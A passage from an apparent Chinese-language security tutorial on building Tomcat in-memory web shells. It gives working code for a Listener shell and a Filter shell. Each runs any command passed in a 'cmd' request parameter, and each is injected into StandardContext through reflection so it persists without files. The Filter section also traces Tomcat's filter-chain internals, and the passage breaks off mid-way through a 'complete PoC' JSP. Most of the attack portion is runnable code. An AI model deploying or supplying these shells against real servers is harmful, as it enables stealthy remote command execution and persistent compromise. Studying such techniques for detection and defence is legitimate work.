title="编写Listener内存马"></a>编写Listener内存马</h4><p>根据我们在上面的内容，我们可以得出以下结论：</p><p>如果我们想要写一个<code>Listener</code>内存马，需要经过以下步骤：</p><ul><li>继承并编写一个恶意<code>Listener</code></li><li>获取<code>StandardContext</code>上下文</li><li>调用<code>StandardContext.addApplicationEventListener()</code>添加恶意<code>Listener</code></li></ul><p>创建shell.jsp,并写出以下的内存马：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.StandardContext&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.lang.reflect.Field&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.connector.Request&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.InputStream&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.util.Scanner&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;java.io.IOException&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    public class Shell_Listener implements ServletRequestListener &#123;</span><br><span class="line"></span><br><span class="line">        public void requestInitialized(ServletRequestEvent sre) &#123;</span><br><span class="line">            HttpServletRequest request = (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            if (cmd != null) &#123;</span><br><span class="line">                try &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; catch (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; catch (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public void requestDestroyed(ServletRequestEvent sre) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(&quot;request&quot;);</span><br><span class="line">    reqF.setAccessible(true);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext context = (StandardContext) req.getContext();</span><br><span class="line">    Shell_Listener shellListener = new Shell_Listener();</span><br><span class="line">    context.addApplicationEventListener(shellListener);</span><br><span class="line">    out.println(&quot;Inject Listener Memory Shell successfully!&quot;);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>访问shell.jsp</p><p><img src="/./../img/ma/image-20250220185002182.png" alt="image-20250220185002182"></p><p>此刻我们的内存马创建成功，访问任意路由即可触发</p><p><img src="/./../img/ma/image-20250220190441787.png" alt="image-20250220190441787"></p><h3 id="Filter内存马"><a href="#Filter内存马" class="headerlink" title="Filter内存马"></a>Filter内存马</h3><h4 id="编写一个简单的Filter"><a href="#编写一个简单的Filter" class="headerlink" title="编写一个简单的Filter"></a>编写一个简单的Filter</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">package com.example.filtershell;</span><br><span class="line"></span><br><span class="line">import javax.servlet.*;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">import static java.lang.System.out;</span><br><span class="line"></span><br><span class="line">public class Test_Filter implements javax.servlet.Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123;</span><br><span class="line">        System.out.println(&quot;Filter initialized&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)</span><br><span class="line">            throws IOException, ServletException &#123;</span><br><span class="line">        System.out.println(&quot;Filter processing request&quot;);</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123;</span><br><span class="line">        out.println(&quot;Filter destroyed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>web.xml配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;web-app xmlns=&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://xmlns.jcp.org/xml/ns/javaee</span><br><span class="line">                             http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span><br><span class="line">         version=&quot;3.1&quot;&gt;</span><br><span class="line">    &lt;filter&gt;</span><br><span class="line">        &lt;filter-name&gt;test&lt;/filter-name&gt;</span><br><span class="line">        &lt;filter-class&gt;com.example.filtershell.Test&lt;/filter-class&gt;</span><br><span class="line">    &lt;/filter&gt;</span><br><span class="line">    &lt;filter-mapping&gt;</span><br><span class="line">        &lt;filter-name&gt;test&lt;/filter-name&gt;</span><br><span class="line">        &lt;url-pattern&gt;/*&lt;/url-pattern&gt;</span><br><span class="line">    &lt;/filter-mapping&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/web-app&gt;</span><br></pre></td></tr></table></figure><p>当我们访问任何路由的时候，控制台继续输出Filter processing request，当我们结束tomcat的时候，会触发destroy方法，从而输出Filter destroyed</p><h4 id="从代码层面分析filter的创建流程"><a href="#从代码层面分析filter的创建流程" class="headerlink" title="从代码层面分析filter的创建流程"></a>从代码层面分析filter的创建流程</h4><p>我们在过滤器进行过滤的地方，也就是doFilter()那里打上断点，观察调用栈。</p><p><img src="/./../img/ma/image-20250219131911755.png" alt="image-20250219131911755"></p><p>我们从上往下跟进，先进入ApplicationFilterChain#internalDoFilter。</p><p><img src="/./../img/ma/image-20250220234934344.png" alt="image-20250220234934344"></p><p>在internalDoFilter函数中通过filter调用了doFilter，而filter是通过filterConfig.getFilter()得到。</p><p><img src="/./../img/ma/image-20250220235614800.png" alt="image-20250220235614800"></p><p>我们注意到filterConfig是ApplicationFilterConfig对象。来自于ApplicationFilterConfig类，那么大概率在前面new了一个ApplicationFilterConfig对象，于是全局搜索关键词new ApplicationFilterConfig,果然如此。</p><p><img src="/./../img/ma/image-20250220235838768.png" alt="image-20250220235838768"></p><p>继续往下跟进调用栈，在ApplicationFilterChain#doFilter调用了ApplicationFilterChain#internalDoFilter</p><p>那么接下来再通过调用栈分析谁调用了ApplicationFilterChain#doFilter，于是来到StandardContextValve类，通过filterChain调用了ApplicationFilterChain#doFilter</p><p><img src="/./../img/ma/image-20250219143248302.png" alt="image-20250219143248302"></p><p>而filterChain来自于ApplicationFilterFactory#createFilterChain</p><p><img src="/./../img/ma/image-20250219143306760.png" alt="image-20250219143306760"></p><p>我们跟进</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"> public static ApplicationFilterChain createFilterChain(ServletRequest request, Wrapper wrapper, Servlet servlet) &#123;</span><br><span class="line">    if (servlet == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        ApplicationFilterChain filterChain = null;</span><br><span class="line">        if (request instanceof Request) &#123;</span><br><span class="line">            Request req = (Request)request;</span><br><span class="line">            if (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                filterChain = new ApplicationFilterChain();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                filterChain = (ApplicationFilterChain)req.getFilterChain();</span><br><span class="line">                if (filterChain == null) &#123;</span><br><span class="line">                    filterChain = new ApplicationFilterChain();</span><br><span class="line">                    req.setFilterChain(filterChain);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            filterChain = new ApplicationFilterChain();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line">        StandardContext context = (StandardContext)wrapper.getParent();</span><br><span class="line">        FilterMap[] filterMaps = context.findFilterMaps();</span><br><span class="line">        if (filterMaps != null &amp;&amp; filterMaps.length != 0) &#123;</span><br><span class="line">            DispatcherType dispatcher = (DispatcherType)request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_TYPE&quot;);</span><br><span class="line">            String requestPath = null;</span><br><span class="line">            Object attribute = request.getAttribute(&quot;org.apache.catalina.core.DISPATCHER_REQUEST_PATH&quot;);</span><br><span class="line">            if (attribute != null) &#123;</span><br><span class="line">                requestPath = attribute.toString();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            String servletName = wrapper.getName();</span><br><span class="line">            FilterMap[] var10 = filterMaps;</span><br><span class="line">            int var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            int var12;</span><br><span class="line">            FilterMap filterMap;</span><br><span class="line">            ApplicationFilterConfig filterConfig;</span><br><span class="line">            for(var12 = 0; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersURL(filterMap, requestPath)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    if (filterConfig != null) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            var10 = filterMaps;</span><br><span class="line">            var11 = filterMaps.length;</span><br><span class="line"></span><br><span class="line">            for(var12 = 0; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                filterMap = var10[var12];</span><br><span class="line">                if (matchDispatcher(filterMap, dispatcher) &amp;&amp; matchFiltersServlet(filterMap, servletName)) &#123;</span><br><span class="line">                    filterConfig = (ApplicationFilterConfig)context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">                    if (filterConfig != null) &#123;</span><br><span class="line">                        filterChain.addFilter(filterConfig);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return filterChain;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return filterChain;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从createFilterChain函数中，我们能够清晰地看到filterChain对象的创建过程</p><ol><li><p><strong>创建空的过滤器链</strong><br><code>filterChain = new ApplicationFilterChain()</code><br>→ 初始化一个空的过滤器链容器。</p></li><li><p><strong>获取上下文对象</strong><br><code>StandardContext context = (StandardContext) wrapper.getParent()</code><br>→ 通过 <code>Wrapper</code> 获取其父容器 <code>StandardContext</code>（管理当前Web应用的配置）。</p></li><li><p><strong>提取过滤器映射规则</strong><br><code>FilterMap[] filterMaps = context.findFilterMaps()</code><br>→ 从 <code>StandardContext</code> 中获取所有过滤器的映射规则（URL路径、Servlet名称等）。</p></li><li><p><strong>匹配并获取过滤器配置</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 遍历FilterMap，通过名称查找对应的FilterConfig</span><br><span class="line">ApplicationFilterConfig filterConfig = </span><br><span class="line">    (ApplicationFilterConfig) context.findFilterConfig(filterMap.getFilterName());</span><br></pre></td></tr></table></figure><p>→ 根据 <code>FilterMap</code> 中的名称，从 <code>StandardContext</code> 中获取具体的过滤器配置。</p></li><li><p><strong>将过滤器加入链中</strong><br><code>filterChain.addFilter(filterConfig)</code><br>→ 将匹配的过滤器按顺序添加到链中，最终形成完整的执行链。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">void addFilter(ApplicationFilterConfig filterConfig) &#123;</span><br><span class="line"></span><br><span class="line">        // Prevent the same filter being added multiple times</span><br><span class="line">        for(ApplicationFilterConfig filter:filters)</span><br><span class="line">            if(filter==filterConfig)</span><br><span class="line">                return;</span><br><span class="line"></span><br><span class="line">        if (n == filters.length) &#123;</span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                new ApplicationFilterConfig[n + INCREMENT];</span><br><span class="line">            System.arraycopy(filters, 0, newFilters, 0, n);</span><br><span class="line">            filters = newFilters;</span><br><span class="line">        &#125;</span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如图示：</p><p>创建 filterChain<br>       ↓<br>获取 StandardContext (wrapper.getParent())<br>       ↓<br>获取 FilterMaps[] (context.findFilterMaps())<br>       ↓<br>遍历 FilterMaps，匹配 URL&#x2F;Servlet ↓<br>       |——匹配成功——→ 获取 FilterConfig (context.findFilterConfig())<br>       |               ↓<br>       |              添加到 filterChain.addFilter()<br>       |<br>       |——匹配失败——→ 跳过<br>       ↓<br>返回 filterChain</p><p><img src="/./../img/ma/image-20250219173026287.png" alt="image-20250219173026287"></p><p>到这里,filter的创建流程我们就梳理完了。所以，我们的核心就是创建一个恶意的Filter添加到FilterConfig中。</p><h4 id="Filter容器与FilterDefs、FilterConfigs、FilterMaps"><a href="#Filter容器与FilterDefs、FilterConfigs、FilterMaps" class="headerlink" title="Filter容器与FilterDefs、FilterConfigs、FilterMaps"></a>Filter容器与FilterDefs、FilterConfigs、FilterMaps</h4><p>FilterDefs：存放FilterDef的数组 ，FilterDef 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p><p>FilterConfigs：存放filterConfig的数组，在 FilterConfig 中主要存放 FilterDef 和 Filter对象等信息</p><p>FilterMaps：存放FilterMap的数组，在 FilterMap 中主要存放了 FilterName 和 对应的URLPattern</p><p>FilterChain：过滤器链，该对象上的 doFilter 方法能依次调用链上的 Filter</p><p>跟进ApplicationFilterFactory#createFilterChain的执行流程流程，上下文(StandardContext)包含了FilterDefs、FilterConfigs、FilterMaps。</p><p><img src="/./../img/ma/image-20250221104457879.png" alt="image-20250221104457879"></p><h5 id="FilterMaps"><a href="#FilterMaps" class="headerlink" title="FilterMaps"></a>FilterMaps</h5><p><img src="/./../img/ma/image-20250221105035158.png" alt="image-20250221105035158"></p><p>以array形式存放着过滤器名字和映射路径</p><h5 id="FilterConfigs"><a href="#FilterConfigs" class="headerlink" title="FilterConfigs"></a>FilterConfigs</h5><p><img src="/./../img/ma/image-20250221110026397.png" alt="image-20250221110026397"></p><p>在 FilterConfig 中主要存放 FilterDef 和 Filter对象</p><h5 id="FilterDefs"><a href="#FilterDefs" class="headerlink" title="FilterDefs"></a>FilterDefs</h5><p>以键值对的形式存储filterDef</p><p><img src="/./../img/ma/image-20250221110301557.png" alt="image-20250221110301557"></p><h4 id="编写内存马"><a href="#编写内存马" class="headerlink" title="编写内存马"></a>编写内存马</h4><p>根据我们在上面的分析，我们可以得出以下结论：</p><p>如果我们想要写一个Filter内存马，需要经过以下步骤：</p><ul><li>获取<code>StandardContext</code>；</li><li>编写一个恶意<code>filter</code>；</li><li>实例化一个<code>FilterDef</code>类，包装<code>filter</code>并存放到<code>StandardContext.filterDefs</code>中；</li><li>实例化一个<code>FilterMap</code>类，并将路径和Filtername绑定，添加到filterMaps中；</li><li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li></ul><h5 id="获取StandardContext"><a href="#获取StandardContext" class="headerlink" title="获取StandardContext"></a>获取StandardContext</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getServletContext();</span><br><span class="line">Field applicationContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">applicationContextField.setAccessible(true);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);</span><br><span class="line">Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">standardContextField.setAccessible(true);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure><h5 id="创建恶意filter"><a href="#创建恶意filter" class="headerlink" title="创建恶意filter"></a>创建恶意filter</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class FilterMemshell implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123; &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123;</span><br><span class="line">        servletResponse.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">        String cmd = servletRequest.getParameter(&quot;cmd&quot;);</span><br><span class="line">        if (cmd != null) &#123;</span><br><span class="line">            Process p = Runtime.getRuntime().exec(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, cmd&#125;);</span><br><span class="line">            InputStream input = p.getInputStream();</span><br><span class="line">            InputStreamReader ins = new InputStreamReader(input, &quot;GBK&quot;);</span><br><span class="line">            BufferedReader br = new BufferedReader(ins);</span><br><span class="line">            servletResponse.getWriter().write(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = br.readLine()) != null) &#123;</span><br><span class="line">                servletResponse.getWriter().write(line);</span><br><span class="line">            &#125;</span><br><span class="line">            servletResponse.getWriter().write(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">            br.close();</span><br><span class="line">            ins.close();</span><br><span class="line">            input.close();</span><br><span class="line">            p.getOutputStream().close();</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="创建filterdef，并添加到上下文中"><a href="#创建filterdef，并添加到上下文中" class="headerlink" title="创建filterdef，并添加到上下文中"></a>创建filterdef，并添加到上下文中</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FilterDef filterDef = new FilterDef();</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">filterDef.setFilter(filterMemshell);</span><br><span class="line">filterDef.setFilterClass(filterMemshell.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><h5 id="创建-filtermap，并添加到上下文中"><a href="#创建-filtermap，并添加到上下文中" class="headerlink" title="创建 filtermap，并添加到上下文中"></a>创建 filtermap，并添加到上下文中</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FilterMap filterMap = new FilterMap();</span><br><span class="line">filterMap.setFilterName(name);</span><br><span class="line">filterMap.addURLPattern(&quot;/*&quot;);</span><br></pre></td></tr></table></figure><h5 id="封装filterConfig及filterDef到filterConfigs"><a href="#封装filterConfig及filterDef到filterConfigs" class="headerlink" title="封装filterConfig及filterDef到filterConfigs"></a>封装filterConfig及filterDef到filterConfigs</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;ApplicationFilterConfig&gt; declaredConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">declaredConstructor.setAccessible(true);</span><br><span class="line">ApplicationFilterConfig applicationFilterConfig = declaredConstructor.newInstance(standardContext, filterDef);</span><br><span class="line">Field filterConfigsField = standardContext.getClass().getDeclaredField(&quot;filterConfigs&quot;);</span><br><span class="line">filterConfigsField.setAccessible(true);</span><br><span class="line">Map filterConfigs = (Map) filterConfigsField.get(standardContext);</span><br><span class="line">filterConfigs.put(name, applicationFilterConfig);</span><br><span class="line">response.getWriter().println(&quot;inj success&quot;);</span><br></pre></td></tr></table></figure><h5 id="完整poc"><a href="#完整poc" class="headerlink" title="完整poc"></a>完整poc</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page import=&quot;java.io.*, java.lang.reflect.*, java.util.*, javax.servlet.*, javax.servlet.Filter, javax.servlet.FilterConfig, javax.servlet.FilterChain, javax.servlet.ServletRequest, javax.servlet.ServletResponse, javax.servlet.ServletException&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationContext, org.apache.catalina.core.StandardContext, org.apache.tomcat.util.descriptor.web.FilterDef, org.apache.tomcat.util.descriptor.web.FilterMap&quot; %&gt;</span><br><span class="line">&lt;%@ page import=&quot;org.apache.catalina.core.ApplicationFilterConfig, org.apache.catalina.Context&quot; %&gt;</span><br><span class="line">&lt;%@ page contentType=&quot;text/html;charset=UTF-8&quot; language=&quot;java&quot; %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">  public class Shell_Filter implements Filter &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void init(FilterConfig filterConfig) throws ServletException &#123; &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123;</span><br><span class="line">      response.setContentType(&quot;text/html;charset=UTF-8&quot;);</span><br><span class="line">      String cmd = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">      if (cmd != null) &#123;</span><br><span class="line">        Process p = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        InputStream inputStream = p.getInputStream();</span><br><span class="line">        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream, &quot;UTF-8&quot;));</span><br><span class="line">        StringBuilder output = new StringBuilder(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        String line;</span><br><span class="line">        while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">          output.append(line).append(&quot;\n&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        output.append(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">        response.getWriter().write(output.toString());</span><br><span class="line">        reader.close();</span><br><span class="line">        return;</span><br><span class="line">      &#125;</span><br><span class="line">      chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void destroy() &#123; &#125;</span><br><span class="line">  &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  try &#123;</span><br><span class="line">    // 获取 StandardContext</span><br><span class="line">    ServletContext servletContext = request.getServletContext();</span><br><span class="line">    Field appContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    appContextField.setAccessible(true);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span><br><span class="line">    standardContextField.setAccessible(true);</span><br><span class="line">    